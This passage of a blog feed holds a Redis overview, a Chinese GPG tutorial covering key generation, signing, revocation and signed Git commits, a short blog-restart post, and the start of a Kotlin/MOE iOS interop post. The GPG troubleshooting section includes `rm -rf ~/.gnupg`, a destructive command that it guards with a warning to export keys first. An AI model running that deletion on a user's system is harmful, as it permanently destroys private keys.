        <content type="text/html" src="http://www.windboy.top/2020/06/01/blog9/"><![CDATA[<p>上一篇博客主要谈到 MySQL 的基础知识和高级特性，现在让我们看一下 Redis 部分。</p><h2 id="Redis-基础"><a href="#Redis-基础" class="headerlink" title="Redis 基础"></a>Redis 基础</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Redis 是速度非常快的非关系型内存键值数据库。<br>Redis 和 MySQL 不同之处在于，Redis 用的是 NoSQL。<br>主要用作缓存，缓存目的：</p><ul><li>高性能：操作缓存就是直接操作内存，所以速度相当快。</li><li>高并发：直接操作缓存能够承受的请求是远远大于直接访问数据库的，所以我们可以考虑把数据库中的部分数据转移到缓存中去，这样用户的一部分请求会直接到缓存这里而不用经过数据库。并且缓存是走内存的，内存天然就支撑高并发。</li></ul><h3 id="为什么速度快？"><a href="#为什么速度快？" class="headerlink" title="为什么速度快？"></a>为什么速度快？</h3><ul><li>核心是基于非阻塞的 I/O 多路复用机制，用很少的线程也能快速处理大量任务。</li><li>完全基于内存，绝大部分请求是纯粹的内存操作，非常快速。数据存在内存中，类似于 HashMap，查找和增删的时间复杂度都是 O(1)。</li><li>采用单线程，数据全都在内存里，单线程去操作就是效率最高的。同时避免了不必要的上下文切换和竞争问题而消耗 CPU，不用去考虑多线程同步和各种锁的问题，如加锁释放锁和死锁导致的性能消耗。另外，单线程天然支持原子操作。</li></ul><p>其他原因：</p><ul><li>数据结构简单，对数据操作也简单。</li><li>底层模型，Redis 构建了自己的 VM 机制。</li><li>C 语言实现。</li><li>客户端与服务端通信使用 Redis 序列化协议 RESP 进行通信。</li></ul><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><ul><li>STRING，可以实现常规 key-value 缓存应用和计数。</li><li>LIST，可以实现分页查询和消息队列。</li><li>SET，可以实现共同好友和去重。</li><li>HASH，可以实现存储对象。</li><li>ZSET，可以实现排行榜。ZSET增加了一个权重参数 score，使得集合中的元素能够按 score 进行有序排列。</li></ul><h4 id="Jedis-实现数据类型的基本操作"><a href="#Jedis-实现数据类型的基本操作" class="headerlink" title="Jedis 实现数据类型的基本操作"></a>Jedis 实现数据类型的基本操作</h4><p>同样演示代码在 <a href="https://github.com/Jiebupup/demo" target="_blank" rel="noopener">https://github.com/Jiebupup/demo</a> 中有，介绍了 Jedis 对应上述五个数据类型的操作。 </p><h3 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h3><p>Redis 是内存型数据库，为了保证数据在断电后不会丢失，需要将内存中的数据持久化到硬盘上。</p><h4 id="RDB-快照"><a href="#RDB-快照" class="headerlink" title="RDB 快照"></a>RDB 快照</h4><p>创建快照来获得存储在内存里面的数据在某个时间点上的副本，再存放到硬盘上。</p><p>实际操作过程是 fork 一个子进程，先将数据集写入临时文件，写入成功后，再替换之前的文件，用二进制压缩存储。</p><p>可以将快照复制到其它服务器从而创建具有相同数据的服务器副本（就是 Redis 的主从结构），还可以将快照留在原服务器以便重启服务器的时候使用。<br>如果系统发生故障，将会丢失最后一次创建快照之后的数据。<br>如果数据量很大，保存快照的时间会很长。</p><h4 id="AOF-文件"><a href="#AOF-文件" class="headerlink" title="AOF 文件"></a>AOF 文件</h4><p>将写命令添加到 AOF 文件（Append Only File）的末尾。</p><p>设置同步选项：使用 AOF 持久化需要设置同步选项，从而确保写命令同步到磁盘文件上的时机。这是因为对文件进行写入并不会马上将内容同步到磁盘上，而是先存储到缓冲区，然后由操作系统决定什么时候同步到磁盘。</p><ul><li>always：会严重减低服务器的性能。</li><li>everysec：比较合适，可以保证系统崩溃时只会丢失一秒左右的数据，并且 Redis 每秒执行一次同步对服务器性能几乎没有任何影响。</li><li>no：并不能给服务器性能带来多大的提升，而且也会增加系统崩溃时数据丢失的数量。</li></ul><p>AOF 重写：随着服务器写请求的增多，AOF 文件会越来越大。Redis 提供了一种将 AOF 重写的特性，能够去除 AOF 文件中的冗余写命令。</p><h2 id="Redis-高级特性"><a href="#Redis-高级特性" class="headerlink" title="Redis 高级特性"></a>Redis 高级特性</h2><h3 id="复制"><a href="#复制" class="headerlink" title="复制"></a>复制</h3><p>Redis 的复制与 MySQL 主从复制类似。<br>Redis 复制水平扩容支撑读高并发，并且从 Redis 2.8 开始支持断点续传，即主从复制过程中，网络连接断掉了，那么可以接着上次复制的地方，继续复制下去。</p><h3 id="哨兵"><a href="#哨兵" class="headerlink" title="哨兵"></a>哨兵</h3><p>可以监听集群中的服务器，并在主服务器进入下线状态时，自动从从服务器中选举出新的主服务器。<br>用于实现 Redis 集群的高可用，本身也是作为一个哨兵集群去运行，互相协同工作。</p><h3 id="集群"><a href="#集群" class="headerlink" title="集群"></a>集群</h3><p>集群中有多个 master 节点，每个 master 又有多个 slave 节点。和哨兵共同实现了集群的高可用。</p><p>Gossip 协议与集中式协议不同：所有节点都持有一份元数据，不同的节点如果出现了元数据的变更，就不断将元数据发送给其它的节点，让其它节点也进行元数据的变更。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>总结一下这一次的技术分享。首先，分享的内容比较便基础，在整理出大量的知识点的同时，我也准备了几个 demo，争取让参与分享的同学巩固一下数据库这块的知识。</p><p>然后就是自己的表达能力需要提升提升，这也是我写这两篇博客的目的，希望自己能在总结和写作中，锻炼自己的表达能力。</p><p>最后还是谈谈我对 MySQL &amp; Redis 学习的看法，我总结的只是部分知识点，MySQL &amp; Redis 的理论知识点偏多，需要记忆的内容也很多。并且在个人项目或者不需要高并发的项目中，很多内容都用不上，用的最多的还是 CRUD。因此我认为熟练地 CRUD 还是很重要的，毕竟是各种项目的基础。如果要想提高自己的能力，对于高阶的知识点还是该记记该背背，更加重要的是写 demo，用代码实战过。  </p>]]></content>
        <author>
            <name><![CDATA[风的个人网站]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.creedowl.com/posts/gpg/</id>
        <title><![CDATA[GPG使用笔记]]></title>
        <updated>2020-04-02T06:47:31+08:00</updated>
        <link href="https://blog.creedowl.com/posts/gpg/"/>
        <content type="text/html" src="https://blog.creedowl.com/posts/gpg/"><![CDATA[<h2 id="why-gpg">Why GPG?</h2>
<p><a href="https://zh.wikipedia.org/wiki/GnuPG">GPG</a> 是一个密码学软件，用于加密、签名通信内容及管理非对称密码学的密钥，具体历史、介绍可以在wiki中看到，<a href="https://gnupg.org/">官网</a></p>
<p>而我使用 GPG 的缘由是，在 Github 上提交时，如果使用 GPG 对提交进行签名，会有一个<code>Verified</code>标识<del>看起来很nb</del></p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1585795152275.png/compress" alt="UTOOLS1585795152275.png"></p>
<p>当然使用 GPG 不仅是为了好看，它能确保你提供的信息是由你自己发布的，无法被别人篡改、冒充，前提是保护好自己的 GPG 私钥</p>
<h2 id="安装">安装</h2>
<p>这边以 MacOS 为示例进行操作</p>
<p><strong>强烈建议 MacOS 用户使用 <a href="https://gpgtools.org/">GPG Suite</a> 进行操作，可以避免一些奇奇怪怪的问题</strong></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">brew cask install gpg-suite
</code></pre></div><p><del>仅安装 GPG 本体</del></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="c1"># deprecated</span>
brew install gpg
</code></pre></div><h2 id="生成密钥">生成密钥</h2>
<p>GPG 采用非对称加密，一切的操作都需要有密钥。网上一些教程中的操作与我使用的 GPG 版本 <code>gpg (GnuPG/MacGPG2) 2.2.17</code> 有点出入，以下操作都在我所使用的版本下进行</p>
<p>有两个命令用于生成密钥，为<code>gpg --gen-key</code>和<code>gpg --full-gen-key</code>，区别是前者采用默认的配置不可更改，后者能自定义配置。我们采用后一种，首先选择密钥类型，默认的<code>1</code>就可以了</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">$ gpg --full-gen-key
gpg <span class="o">(</span>GnuPG/MacGPG2<span class="o">)</span> 2.2.17<span class="p">;</span> Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2019</span> Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

请选择您要使用的密钥类型：
   <span class="o">(</span>1<span class="o">)</span> RSA 和 RSA （默认）
   <span class="o">(</span>2<span class="o">)</span> DSA 和 Elgamal
   <span class="o">(</span>3<span class="o">)</span> DSA（仅用于签名）
   <span class="o">(</span>4<span class="o">)</span> RSA（仅用于签名）
您的选择是？ <span class="m">1</span>
</code></pre></div><p>接着选择密钥长度，默认<code>2048</code>即可</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">RSA 密钥的长度应在 1024 位与 4096 位之间。
您想要使用的密钥长度？(2048) 2048
</code></pre></div><p>然后设定密钥的有效期限，我们没有特殊需求，设置永不过期即可</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">请设定这个密钥的有效期限。
         0 = 密钥永不过期
      &lt;n&gt;  = 密钥在 n 天后过期
      &lt;n&gt;w = 密钥在 n 周后过期
      &lt;n&gt;m = 密钥在 n 月后过期
      &lt;n&gt;y = 密钥在 n 年后过期
密钥的有效期限是？(0) 0
</code></pre></div><p>确认上述设置后，依次输入姓名、邮箱和注释，这里我使用随机信息用于演示</p>
<pre><code>GnuPG 需要构建用户标识以辨认您的密钥。

真实姓名： naive
电子邮件地址： naive@test.com
注释： too young too simple
您选定了此用户标识：
    “naive (too young too simple) &lt;naive@test.com&gt;”

更改姓名（N）、注释（C）、电子邮件地址（E）或确定（O）/退出（Q）？
</code></pre>
<p>确定后，需要设定密钥的密码，如果你采用了 <code>GPG Suite</code> ，会出现一个窗口，在此输入密码</p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1585796741624.png/compress" alt="UTOOLS1585796741624.png"></p>
<p>如果没使用<code>GPG Suite</code>，则会在你当前终端弹出一个全屏终端窗口，同样是输入密码。</p>
<blockquote>
<p>注意，在 mac 终端环境下，如果语言是中文的话，这个终端窗口可能会乱码，但不影响使用，也可以临时设置语言为英文解决这个问题<code>LANGUAGE=en gpg --full-generate-key</code>。但千万不要用<code>ctrl-c</code>结束这个进程，这会破坏当前终端环境，后面的输入会变得很奇怪，而且后台进程不会结束，会占满你的CPU</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">我们需要生成大量的随机字节。在质数生成期间做些其他操作（敲打键盘
、移动鼠标、读写硬盘之类的）将会是一个不错的主意；这会让随机数
发生器有更好的机会获得足够的熵。
gpg: 密钥 4C26D2E451FFDAF1 被标记为绝对信任
gpg: 目录‘/Users/creedowl/.gnupg/openpgp-revocs.d’已创建
gpg: 吊销证书已被存储为‘/Users/creedowl/.gnupg/openpgp-revocs.d/0B3C52F1EF07B14EA7C45C9A4C26D2E451FFDAF1.rev’
公钥和私钥已经生成并被签名。

pub   rsa2048 2020-04-02 [SC]
      0B3C52F1EF07B14EA7C45C9A4C26D2E451FFDAF1
uid                      naive (too young too simple) &lt;naive@test.com&gt;
sub   rsa2048 2020-04-02 [E]
</code></pre></div><p>这样，密钥就生成完成，其中<code>4C26D2E451FFDAF1</code>就是你的密钥名，后续操作都需要通过这个密钥名选择密钥，但也可以通过之前设置的姓名或邮箱代替操作</p>
<h2 id="gpg-常用操作">GPG 常用操作</h2>
<p>GPG 最基础的操作就是对文件等信息进行加密、签名，首先创建一个测试文件<code>test.txt</code></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="nb">echo</span> <span class="nb">test</span> &gt; test.txt
</code></pre></div><h3 id="加密">加密</h3>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --recipient creedowl --output test.txt.gpg --encrypt test.txt
</code></pre></div><p>其中<code>--recipient</code>指定接收者，简写为<code>-r</code>，设定接受者时需要你本地有接收者的<strong>公钥</strong>，可以用密钥名、姓名或者邮箱进行指定。<code>--output</code>指定输出文件名，可省略。<code>--encrypt</code>指定待加密的文件，简写为<code>-e</code>。这样在你当前目录下会生成一个<code>test.txt.gpg</code>即加密后的文件，你就可以把这个文件发送给接受者，不必担心文件内容被第三方读取</p>
<p><strong>注意</strong>这里生成加密文件为二进制格式，有时候（如通过邮件发送）不便于操作，可以加上<code>--armor</code>参数（简写为<code>-a</code>）生成文本格式的密文，如</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg -r creedowl -ae test.txt
</code></pre></div><p>生成的加密文件为<code>test.txt.asc</code></p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">-----BEGIN PGP MESSAGE-----

hQEMA9KmvDhAMTGrAQf+KITqx4HTpWsevIEfRFlw5g+jt8l8ol3fuww0gBoMEPBG
KaqxCmjIpHZdGmaXwBSKadmeieZGLsm1CYuf4gbv4FpdWgveVWnLvB/HmwuvnmJt
YhTtapNgkQ++mwPbH4WKeOFQ58U5dZ7C+R8rrucRRYQBRTH6AJQY82aV1KXTqyF1
D8c/2ANW7aCWr8W/ogCbEqH47VE3foP+aSD+JMPtdnaYWIPzyr5x5lw6ASwxD4hB
ikOUcJTxp+GyFLTd3n1zCvSP9ZQzvolur7soqZVP8t4hxlALGL+KYN4YgubcPt5y
bucMYWkbLlZM+AuAYzSCLaSmkgkiYUFEkwKJWdLr+NJGAY5Mk+bnEP2k/kKxl9vo
/LVsloiYbg9M184LxUNfZRBnKcI9vKw/C6uU2Ee5wKUMsy3Epnp60Fe5u5fj5yn7
0JjMBmY+gQ==
=8K/i
-----END PGP MESSAGE-----
</code></pre></div><h3 id="解密">解密</h3>
<p>有了密文就要对其进行解密得到原文。注意要进行解密，你必须有接受者的<strong>私钥</strong>。公钥是公开的，任何人都可以查看、使用，而<strong>私钥</strong>是私有的，一定要保管好，如果泄露了这个 GPG 密钥就等同于失效了，需要吊销。这就是非对称加密</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">	gpg --decrypt test.txt.asc --output out.txt
</code></pre></div><p>其中<code>--decrypt</code>声明该命令进行解密，简写为<code>-d</code>，<code>--output</code>指定输出文件，默认输出到终端。注意解密时需要输入你密钥的密码，所以也一定要保管好密码</p>
<h3 id="签名">签名</h3>
<p>有的时候不需要对文件进行签名，只需要确保文件是由本人发出的，这个时候就可以用到签名</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --sign test.txt
</code></pre></div><p>会生成二进制的签名文件<code>test.txt.gpg</code>，如果想生成文本类型的签名，使用</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --clearsign test.txt
</code></pre></div><p>会生成文本类型的签名文件<code>test.txt.asc</code></p>
<p>注意以上两种方式原文和签名是在同一个文件中，查看<code>test.txt.asc</code></p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

test
-----BEGIN PGP SIGNATURE-----

iQFDBAEBCAAtFiEECzxS8e8HsU6nxFyaTCbS5FH/2vEFAl6FX+cPHG5haXZlQHRl
c3QuY29tAAoJEEwm0uRR/9rxGNsH/AmjJiT19q5caq9Pe8tMRnR2yvZIGWbMD3Ch
UTkyGMkSPMIo6XRpYPlANe2/dddBT2l7EAPy2lAxaa8LcjsxtRhJG4GxMaCcujik
M6MX3IOfa1m9aDP1IY3Sh2U07j3t+8dawahR8EUF2D+rtvx24ybnwpWpKbDVsGyp
Mt06BI3pWC3opMRYPCl21IBhPhaPPnvXF7X8DMP+2VqZye2juX2oG1KMkZWQuiBb
/D7DYlx6/ainu0cJw6UL8YXHag7tkUeKtTPQbBpCsszOuxJZ74gduIUzDcokayCB
DM9qB/GpUyVOOTwfLMBta6JP5BO8ppPaPdPX46kKDqLKG7eh4bQ=
=Q4/W
-----END PGP SIGNATURE-----
</code></pre></div><p>因为是签名，不会对内容进行加密，所以直接显示原文。如果想把原始文件分离出来，使用</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --output out.txt -d test.txt.gpg
</code></pre></div><p>分离的同时还顺便校验了签名。注意这里<code>test.txt.gpg</code>是上面生成的二进制<strong>签名</strong>文件，也可以用<code>test.txt.asc</code></p>
<p>如果每次都要分离，就很麻烦，而且没有安装 GPG 的用户就无法使用源文件了。所以更好的方式是分离源文件和签名文件</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --detach-sign --armor test.txt
</code></pre></div><p>这样会生成一个单独的、文本类型的签名文件<code>test.txt.sig</code></p>
<blockquote>
<p>注意：如果有多个私钥，可以用<code>-u</code>参数选择</p>
</blockquote>
<h3 id="签名校验">签名校验</h3>
<p>收到文件和签名文件后，需要对签名进行校验</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --verify test.txt.sig test.txt
</code></pre></div><p>如果签名校验成功，会显示</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg: 签名建立于 四  4/ <span class="m">2</span> 11:49:35 <span class="m">2020</span> CST
gpg:               使用 RSA 密钥 34B368EFC6FA8941B4A096CFFA4C884FBE8164D7
gpg: 完好的签名，来自于 “creedowl &lt;creedowl@gmail.com&gt;” <span class="o">[</span>绝对<span class="o">]</span>
</code></pre></div><h3 id="导入导出">导入导出</h3>
<p>当你需要与他人交换数据时，需要导出自己的公钥，同时导入他人的公钥；而如果你更换电脑，就需要导出自己的私钥。这就涉及到了密钥的导入导出</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg -a --output public_key.txt --export naive
</code></pre></div><p>上述命令用于导出公钥，相关参数在上文都有介绍。接着你就可以把<code>public_key.txt</code>发布给他人</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg -a --output private_key.txt --export-secret-keys naive
</code></pre></div><p>上述命令用于导出私钥，一定要保管好，建议在脱机情况下进行操作</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --improt <span class="o">[</span>密钥文件<span class="o">]</span>
</code></pre></div><p>上述命令用于导入密钥，不区分公钥私钥</p>
<h3 id="查看所有密钥">查看所有密钥</h3>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg -k
</code></pre></div><h3 id="生成吊销证书">生成吊销证书</h3>
<p>当你的私钥泄露或者更换时，需要吊销失效的密钥，这时就需要使用吊销证书</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --gen-revoke naive
</code></pre></div><p>接着选择吊销原因，就能生成吊销证书</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">sec  rsa2048/4C26D2E451FFDAF1 2020-04-02 naive (too young too simple) &lt;naive@test.com&gt;

要为这个密钥创建一个吊销证书吗？(y/N) y
请选择吊销的原因：
  0 = 未指定原因
  1 = 密钥已泄漏
  2 = 密钥被替换
  3 = 密钥不再使用
  Q = 取消
（也许您会想要在这里选择 1）
您的决定是什么？ 1
请输入描述（可选）；以空白行结束：
&gt;
吊销原因：密钥已泄漏
（未给定描述）
这样可以吗？ (y/N) y
已强行使用 ASCII 字符封装过的输出。
-----BEGIN PGP PUBLIC KEY BLOCK-----
Comment: This is a revocation certificate

****
-----END PGP PUBLIC KEY BLOCK-----
已创建吊销证书。

请把这个文件转移到一个您可以藏起来的介质上；如果坏人获取到了这
份证书的话，那么他就能使用它并让您的密钥无法继续使用。把此证书
打印出来再存放到安全的地方也是很好的方法，以免您的保存媒体变得
不可读。但是千万小心：您机器上的打印系统可能会在打印过程中储存
这些数据，并使得其他人看到！
</code></pre></div><p>只需要保存中间的吊销证书，当密钥泄露时将其发送到公钥服务器，就可以吊销旧密钥</p>
<h3 id="编辑密钥">编辑密钥</h3>
<p>有时候需要对密钥进行编辑，如修改信任度，生成子密钥等，使用以下命令</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --edit-key naive
</code></pre></div><p>接着就会进入交互模式等待命令，输入<code>help</code>可以查看所有操作</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">gpg (GnuPG/MacGPG2) 2.2.17; Copyright (C) 2019 Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

私钥可用。

sec  rsa2048/4C26D2E451FFDAF1
     创建于：2020-04-02  有效至：永不       可用于：SC
     信任度：绝对        有效性：绝对
ssb  rsa2048/A86AB46BDC677F8F
     创建于：2020-04-02  有效至：永不       可用于：E
[ 绝对 ] (1). naive (too young too simple) &lt;naive@test.com&gt;

gpg&gt;
</code></pre></div><h2 id="使用-gpg-签名-git-commit">使用 GPG 签名 Git Commit</h2>
<p>这就是我使用 GPG 的原因，下面开始配置，首先配置 git</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="c1"># 设置全局默认密钥</span>
git config --global user.signingkey &lt;密钥ID&gt;

<span class="c1"># 设置强制使用GPG签名</span>
git config --global commit.gpgsign <span class="nb">true</span>
</code></pre></div><p>之后在提交时，只需要带上<code>-S</code>参数，就能对提交进行签名</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">git commit -S -m <span class="s2">&#34;xxx&#34;</span>
</code></pre></div><p>查看 git 日志时，带上<code>--show-signature</code>参数就能看到签名信息</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">git log --show-signature
</code></pre></div><p>最后一步，需要把你的公钥提交到 github，否则它怎么知道这个签名是你的呢？将之前生成的文本类型的公钥<code>public_key.txt</code>提交到 <a href="https://github.com/settings/keys">github</a>，之后你的提交在 github 上就有像开头那样的绿色小勾了</p>
<h2 id="faq">FAQ</h2>
<h3 id="解决git提交时出现error-gpg-failed-to-sign-the-data">解决git提交时出现<code>error: gpg failed to sign the data</code></h3>
<p>以下是原始解决方案，虽然能解决问题，但体验不好，在 IDE 中提交时难以输入密码，建议 MacOS 用户采用上面说的 <code>GPG Suite</code>进行操作，它可以接管密码输入操作，弹出一个独立窗口用于输入，还能将密码添加到 iCloud 钥匙串中，避免重复输入密码。如果你已经在使用<code>GPG Suite</code>，但仍然遇到了这个问题，可以尝试重装<code>GPG Suite</code></p>
<ol>
<li>
<p>导出密钥（私钥）<strong>重要</strong></p>
</li>
<li>
<p>卸载 GPG</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">brew uninstall gnupg gnutls
   
brew cask uninstall gpg-suite
</code></pre></div></li>
<li>
<p>删除 gpg 文件夹，<strong>请确认已经导出密钥</strong></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">rm -rf ~/.gnupg
</code></pre></div></li>
<li>
<p>重新安装<code>GPG Suite</code>，<strong>不需要手动安装 GPG</strong></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">brew cask install gpg-suite
</code></pre></div></li>
<li>
<p>导入密钥</p>
</li>
</ol>
<p>这时 <code>GPG Suite</code>应该已经可以正常工作了</p>
<hr>
<p><em>原始方案</em></p>
<p>首先测试<code>gpg</code>工作是否正常</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="nb">echo</span> <span class="s2">&#34;test&#34;</span> <span class="p">|</span> gpg --clearsign
</code></pre></div><p>如果出现下面的错误</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

test
gpg: 签名时失败： Inappropriate ioctl for device
gpg: [stdin]: clear-sign failed: Inappropriate ioctl for device
</code></pre></div><p>说明<code>gpg</code>无法打开输入密码的窗口。在生成<code>gpg key</code>时，如果指定了密码，在签名时就需要输入。而这时<code>gpg</code>不知道从哪里读取输入，所以可以用以下的命令指定<code>tty</code></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="nb">export</span> <span class="nv">GPG_TTY</span><span class="o">=</span><span class="k">$(</span>tty<span class="k">)</span> 
</code></pre></div><p>这样就可以正常弹出输入密码的窗口。</p>
<hr>
<p>但我不喜欢这个全屏窗口，主要是在mac上<code>gpg</code>语言为中文时，这个窗口会乱码，所以用另一个方法解决。编辑<code>~/.gnupg/gpg.conf</code>，添加以下内容</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">use-agent 
pinentry-mode loopback
</code></pre></div><p>再编辑<code>~/.gnupg/gpg-agent.conf</code>，添加以下内容</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">allow-loopback-pinentry
</code></pre></div><p>最后输入<code>echo RELOADAGENT | gpg-connect-agent</code>重启<code>agent</code>就生效了，这样可以直接在终端输入密码</p>
<blockquote>
<p><a href="https://d.sb/2016/11/gpg-inappropriate-ioctl-for-device-errors">source</a></p>
</blockquote>]]></content>
        <author>
            <name><![CDATA[Creedowl’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.creedowl.com/posts/renew/</id>
        <title><![CDATA[重新开始]]></title>
        <updated>2020-03-19T13:28:13+08:00</updated>
        <link href="https://blog.creedowl.com/posts/renew/"/>
        <content type="text/html" src="https://blog.creedowl.com/posts/renew/"><![CDATA[<p>突然发现距上一篇blog发布已经过去了快一年的时间，原先的blog也疏于打理，只有寥寥几篇文章，图床基本失效。主要因为我比较懒，认真整理一篇blog也是费时费力的事情。但自己整理一些文章是很有意义的事情，能记录下自己的学习历程，总结知识，再次遇到相同的问题也可以回头参考。</p>
<p>blog一直没更新有个诱因是微博图床开启了防盗链，导致blog中许多图片都无法访问了<del>老王背锅</del>，又懒得修复。同时看上了<a href="https://gohugo.io/">hugo</a>这个框架，正好也在学习<code>golang</code>，就想从<code>hexo</code>更换到<code>hugo</code>。但这两个框架有个很大的区别<del>我觉得</del>，就是<code>hexo</code>是一堆前端工程师搞的，而<code>hugo</code>是一堆后端工程师搞的，这就导致了<code>hugo</code>没有啥好看的主题，也就一直鸽下去了。</p>
<p>去年年中的时候就打算和@queensferry写一个Hugo主题<a href="https://github.com/queensferryme/hugo-theme-verse">verse</a>，立项的时候很多想法，但做起来就不想动了。摸完页面框架后就鸽了，一方面实在不会设计，另一方面调各种样式是真的蛋疼。鸽了半年又捡起来<del>虽然我没写啥</del>，不过渐渐也有点样子了。但今天发现了一个很棒的主题<a href="https://github.com/Track3/hermit">hermit</a>，几乎就是我想要的，里面很多设计就是我当初构想的内容，马上捡起了blog。</p>
<p>这一年来也计划整理个人笔记软件，在尝试了数个软件后，有印象笔记，为知笔记，有道云笔记，onenote及一堆开源笔记应用，都不太满足我的需求。最后发现了notion这个东西贼香（主要对学生免费了），最后就选择了它。不过这也导致我手上一堆笔记分散在各处，打算后面整理清楚<del>水</del>几篇blog出来。</p>]]></content>
        <author>
            <name><![CDATA[Creedowl’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.noisyfox.io/moe-native-types.html</id>
        <title><![CDATA[Working with native types: Advanced]]></title>
        <updated>2019-09-22T05:23:17+08:00</updated>
        <link href="https://www.noisyfox.io/moe-native-types.html"/>
        <content type="text/html" src="https://www.noisyfox.io/moe-native-types.html"><![CDATA[<p>After using MOE for several years we discovered some common problems when dealing with native types (Core Foundation Types &amp; Cocoa Types). Here are some of our findings.</p>



<h1>Container Types (NSArray, NSDictionary, CFArrayRef, etc.)</h1>



<ol><li>The content in those containers must be corresponding native types, e.g., values of a <code>NSArray</code> must all be <code>NSObject</code>s, while values of a <code>CFArrayRef</code> must all be <code>OpaquePtr</code>s.<ol><li>NatJ does not automatically convert Java-only types (include primitive types) to compatible native types and vice versa when dealing with containers. When adding values to those containers you need to manually convert it to a corresponding native type. And when reading the value you also need to explicitly convert it to a Java type.</li><li>If you try to store a <strong>Core Foundation</strong> type in a <strong>Cocoa</strong> container, you need to cast it using the <strong>Toll-Free Bridging</strong> which I will talk about later.</li></ol></li><li>Arrays and dictionaries can not have <code>null</code> as either key or value.</li></ol>



<p>If you ever used the iOS <strong>KeyChain</strong> APIs you may did something similar as follows in Objective-C(simplified):</p>



<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">CFErrorRef error = NULL;

SecAccessControlRef access =
SecAccessControlCreateWithFlags(kCFAllocatorDefault,
                                kSecAttrAccessibleWhenUnlockedThisDeviceOnly,
                                kSecAccessControlPrivateKeyUsage|kSecAccessControlUserPresence,
                                &amp;error);

NSData* tag = [@"some tag" dataUsingEncoding:NSUTF8StringEncoding];

NSDictionary* attributes =
@{ (id)kSecClass:                   (id)kSecClassKey,
   (id)kSecAttrKeyType:             (id)kSecAttrKeyTypeECSECPrimeRandom,
   (id)kSecAttrKeySizeInBits:       @256,
   (id)kSecAttrTokenID:             (id)kSecAttrTokenIDSecureEnclave,
   (id)kSecPrivateKeyAttrs:
       @{ (id)kSecAttrIsPermanent:    @YES,
          (id)kSecAttrApplicationTag:  tag,
          (id)kSecAttrAccessControl:  (__bridge id)access
        },
   };

SecKeyRef privateKey = SecKeyCreateRandomKey((__bridge CFDictionaryRef)attributes,
                                             &amp;error);</pre>



<p>The corresponding Kotlin code will be:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">val pError = PtrFactory.newOpaquePtrReference(CFErrorRef::class.java)

val access = Security.SecAccessControlCreateWithFlags(
    CoreFoundation.CFAllocatorGetDefault(),
    Security.kSecAttrAccessibleWhenUnlockedThisDeviceOnly(),
    SecAccessControlCreateFlags.PrivateKeyUsage or SecAccessControlCreateFlags.UserPresence,
    pError
)
val tag = NSString.stringWithString("some tag").dataUsingEncoding(NSUTF8StringEncoding)

